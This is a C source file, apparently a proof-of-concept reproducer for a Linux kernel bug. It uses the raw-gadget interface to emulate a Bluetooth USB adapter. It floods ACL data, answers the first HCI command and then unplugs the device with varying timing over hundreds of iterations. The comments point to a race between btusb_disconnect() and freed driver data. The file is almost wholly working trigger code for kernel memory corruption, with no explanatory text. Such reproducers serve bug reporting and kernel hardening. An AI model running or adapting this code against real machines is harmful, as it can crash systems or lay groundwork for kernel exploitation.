// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

typedef uint8_t  __u8;
typedef uint16_t __u16;
typedef uint32_t __u32;
typedef uint16_t __le16;

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	__u8	driver_name[UDC_NAME_LENGTH_MAX];
	__u8	device_name[UDC_NAME_LENGTH_MAX];
	__u8	speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	__u32		type;
	__u32		length;
	__u8		data[0];
};

struct usb_raw_ep_io {
	__u16		ep;
	__u16		flags;
	__u32		length;
	__u8		data[0];
};

#define USB_RAW_EPS_NUM_MAX	30
#define USB_RAW_EP_NAME_MAX	16
#define USB_RAW_EP_ADDR_ANY	0xff

struct usb_raw_ep_caps {
	__u32	type_control	: 1;
	__u32	type_iso	: 1;
	__u32	type_bulk	: 1;
	__u32	type_int	: 1;
	__u32	dir_in		: 1;
	__u32	dir_out		: 1;
};

struct usb_raw_ep_limits {
	__u16	maxpacket_limit;
	__u16	max_streams;
	__u32	reserved;
};

struct usb_raw_ep_info {
	__u8				name[USB_RAW_EP_NAME_MAX];
	__u32				addr;
	struct usb_raw_ep_caps		caps;
	struct usb_raw_ep_limits	limits;
};

struct usb_raw_eps_info {
	struct usb_raw_ep_info	eps[USB_RAW_EPS_NUM_MAX];
};

struct usb_endpoint_descriptor {
	__u8  bLength;
	__u8  bDescriptorType;
	__u8  bEndpointAddress;
	__u8  bmAttributes;
	__le16 wMaxPacketSize;
	__u8  bInterval;
	__u8  bRefresh;
	__u8  bSynchAddress;
} __attribute__((packed));

struct usb_ctrlrequest {
	__u8  bRequestType;
	__u8  bRequest;
	__le16 wValue;
	__le16 wIndex;
	__le16 wLength;
} __attribute__((packed));

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE		_IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE	_IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE		_IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ		_IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EPS_INFO		_IOR('U', 11, struct usb_raw_eps_info)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

#define USB_SPEED_HIGH 3

#define EP_INT_IN_ADDR   0x85
#define EP_BULK_IN_ADDR  0x81
#define EP_BULK_OUT_ADDR 0x02

static const __u8 dev_desc[18] = {
	0x12, 0x01,
	0x00, 0x02,
	0xe0, 0x01, 0x01,
	0x40,
	0x6b, 0x1d,
	0x04, 0x01,
	0x40, 0x01,
	0x00, 0x00, 0x00,
	0x01,
};

static const __u8 cfg_desc[39] = {
	0x09, 0x02, 0x27, 0x00, 0x01, 0x01, 0x00, 0xa0, 0x32,

	0x09, 0x04, 0x00, 0x00, 0x03, 0xe0, 0x01, 0x01, 0x00,

	0x07, 0x05, EP_INT_IN_ADDR, 0x03, 0x40, 0x00, 0x01,

	0x07, 0x05, EP_BULK_IN_ADDR, 0x02, 0x00, 0x02, 0x00,

	0x07, 0x05, EP_BULK_OUT_ADDR, 0x02, 0x00, 0x02, 0x00,
};

static struct usb_endpoint_descriptor ep_int_in = {
	9, 0x05, EP_INT_IN_ADDR, 0x03, 64, 1, 0, 0
};
static struct usb_endpoint_descriptor ep_bulk_in = {
	9, 0x05, EP_BULK_IN_ADDR, 0x02, 512, 0, 0, 0
};
static struct usb_endpoint_descriptor ep_bulk_out = {
	9, 0x05, EP_BULK_OUT_ADDR, 0x02, 512, 0, 0, 0
};

static int fd = -1;
static int h_int_in = -1, h_bulk_in = -1, h_bulk_out = -1;
static int configured;
static int g_verbose;

#define LOG(fmt, ...) do { \
	printf("[poc] " fmt "\n", ##__VA_ARGS__); fflush(stdout); \
} while (0)

static void ep0_write(const void *data, unsigned len)
{
	__u8 buf[4096];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;

	io->ep = 0;
	io->flags = 0;
	io->length = len;
	if (len)
		memcpy(io->data, data, len);
	if (ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io) < 0 && g_verbose)
		LOG("ep0_write(%u) failed: %s", len, strerror(errno));
}

static int ep0_read(void *data, unsigned len)
{
	__u8 buf[4096];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	int rv;

	io->ep = 0;
	io->flags = 0;
	io->length = len;
	rv = ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
	if (rv < 0) {
		if (g_verbose)
			LOG("ep0_read(%u) failed: %s", len, strerror(errno));
		return rv;
	}
	if (data && rv > 0)
		memcpy(data, io->data, rv > (int)len ? (int)len : rv);
	return rv;
}

static int ep_write(int handle, const void *data, unsigned len)
{
	__u8 buf[4096];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	int rv;

	io->ep = handle;
	io->flags = 0;
	io->length = len;
	memcpy(io->data, data, len);
	rv = ioctl(fd, USB_RAW_IOCTL_EP_WRITE, io);
	if (rv < 0 && g_verbose)
		LOG("ep_write(h=%d,%u) failed: %s", handle, len, strerror(errno));
	return rv;
}

static void ep0_stall(void)
{
	ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}

static void ep0_ack(void)
{
	ep0_read(NULL, 0);
}

static void enable_endpoints(void)
{
	h_int_in = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, &ep_int_in);
	h_bulk_in = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_in);
	h_bulk_out = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_out);
	if (g_verbose || h_int_in < 0 || h_bulk_in < 0 || h_bulk_out < 0)
		LOG("ep_enable int=%d bulk_in=%d bulk_out=%d",
		    h_int_in, h_bulk_in, h_bulk_out);
}

static void send_cmd_complete(__u16 opcode, __u8 status)
{
	__u8 evt[6];

	evt[0] = 0x0e;
	evt[1] = 0x04;
	evt[2] = 0x01;
	evt[3] = opcode & 0xff;
	evt[4] = opcode >> 8;
	evt[5] = status;
	ep_write(h_int_in, evt, sizeof(evt));
}

static void push_acl_backlog(int bursts)
{
	__u8 pkt[512];
	int i, j;

	for (i = 0; i < 512; i += 4) {
		pkt[i + 0] = 0x2a;
		pkt[i + 1] = 0x00;
		pkt[i + 2] = 0x00;
		pkt[i + 3] = 0x00;
	}
	for (j = 0; j < bursts; j++) {
		if (ep_write(h_bulk_in, pkt, sizeof(pkt)) < 0)
			break;
	}
}

static int g_jitter_us;

static int g_acl_bursts = 24;

static int run_once(int iter)
{
	struct usb_raw_init init;
	__u8 ebuf[sizeof(struct usb_raw_event) + sizeof(struct usb_ctrlrequest)];
	struct usb_raw_event *event = (struct usb_raw_event *)ebuf;
	struct usb_ctrlrequest *ctrl = (struct usb_ctrlrequest *)event->data;
	int hci_cmds = 0;
	int rv;

	configured = 0;
	h_int_in = h_bulk_in = h_bulk_out = -1;

	fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0) {
		LOG("open(/dev/raw-gadget): %s", strerror(errno));
		return -1;
	}

	memset(&init, 0, sizeof(init));
	strcpy((char *)init.driver_name, "dummy_udc");
	strcpy((char *)init.device_name, "dummy_udc.0");
	init.speed = USB_SPEED_HIGH;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &init) < 0) {
		LOG("USB_RAW_IOCTL_INIT: %s", strerror(errno));
		close(fd);
		fd = -1;
		return -1;
	}
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		LOG("USB_RAW_IOCTL_RUN: %s", strerror(errno));
		close(fd);
		fd = -1;
		return -1;
	}
	if (g_verbose)
		LOG("iter %d: gadget running (jitter %d us)", iter, g_jitter_us);

	for (;;) {
		memset(ebuf, 0, sizeof(ebuf));
		event->type = 0;
		event->length = sizeof(struct usb_ctrlrequest);
		if (ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event) < 0) {
			LOG("EVENT_FETCH: %s", strerror(errno));
			break;
		}

		if (event->type == USB_RAW_EVENT_CONNECT)
			continue;
		if (event->type != USB_RAW_EVENT_CONTROL) {
			if (event->type == USB_RAW_EVENT_DISCONNECT)
				break;
			continue;
		}

		__u8 rt = ctrl->bRequestType;
		__u8 req = ctrl->bRequest;
		__u16 val = ctrl->wValue;
		__u16 len = ctrl->wLength;

		if ((rt & 0x60) != 0x00) {
			__u8 cmd[512];
			__u16 opcode = 0;

			memset(cmd, 0, sizeof(cmd));
			if (!(rt & 0x80)) {
				if (len > sizeof(cmd))
					len = sizeof(cmd);
				if (len)
					ep0_read(cmd, len);
				else
					ep0_ack();
				opcode = cmd[0] | (cmd[1] << 8);
			} else {
				ep0_stall();
				continue;
			}

			hci_cmds++;
			if (g_verbose)
				LOG("iter %d: HCI cmd #%d opcode 0x%04x len %u",
				    iter, hci_cmds, opcode, len);

			if (hci_cmds == 1) {

				push_acl_backlog(g_acl_bursts);

				if (g_jitter_us)
					usleep(g_jitter_us);

				send_cmd_complete(opcode, 0x0c);

				usleep(20 * 1000);

				if (g_verbose)
					LOG("iter %d: unplug -> btusb_disconnect() -> kfree(data)",
					    iter);
				close(fd);
				fd = -1;
				return 0;
			}
			send_cmd_complete(opcode, 0x0c);
			continue;
		}

		switch (req) {
		case 0x06:
			if (!len) { ep0_ack(); break; }
			switch (val >> 8) {
			case 1:
				ep0_write(dev_desc,
					  len < sizeof(dev_desc) ? len : sizeof(dev_desc));
				break;
			case 2:
				ep0_write(cfg_desc,
					  len < sizeof(cfg_desc) ? len : sizeof(cfg_desc));
				break;
			default:
				ep0_stall();
				break;
			}
			break;
		case 0x09:
			enable_endpoints();
			rv = ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0);
			if (rv < 0)
				LOG("CONFIGURE: %s", strerror(errno));
			ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, 0x32);
			configured = 1;
			ep0_ack();
			break;
		case 0x0b:
			ep0_ack();
			break;
		case 0x00:
			if ((rt & 0x80) && len) {
				__u8 st[2] = { 0, 0 };
				ep0_write(st, len < 2 ? len : 2);
			} else {
				ep0_ack();
			}
			break;
		case 0x08:
			if (len) {
				__u8 c = configured ? 1 : 0;
				ep0_write(&c, 1);
			} else {
				ep0_ack();
			}
			break;
		case 0x05:
			ep0_ack();
			break;
		case 0x01:
		case 0x03:
			ep0_ack();
			break;
		default:
			if (g_verbose)
				LOG("unhandled std req 0x%02x/0x%02x", rt, req);
			ep0_stall();
			break;
		}
	}

	if (fd >= 0) {
		close(fd);
		fd = -1;
	}
	return 0;
}

int main(int argc, char **argv)
{
	int iters = 400;
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);

	if (argc > 1)
		iters = atoi(argv[1]);
	if (argc > 2)
		g_acl_bursts = atoi(argv[2]);
	if (iters <= 1) {
		g_verbose = 1;
		iters = 1;
	}

	LOG("start: %d iteration(s), %d acl bursts", iters, g_acl_bursts);

	for (i = 0; i < iters; i++) {

		g_jitter_us = (i % 32) * 70;
		if (run_once(i) < 0)
			break;
		if ((i % 25) == 0)
			LOG("iter %d done", i);
		usleep(40 * 1000);
	}

	LOG("finished %d iterations; waiting for any deferred report", i);
	sleep(5);
	LOG("done");
	return 0;
}
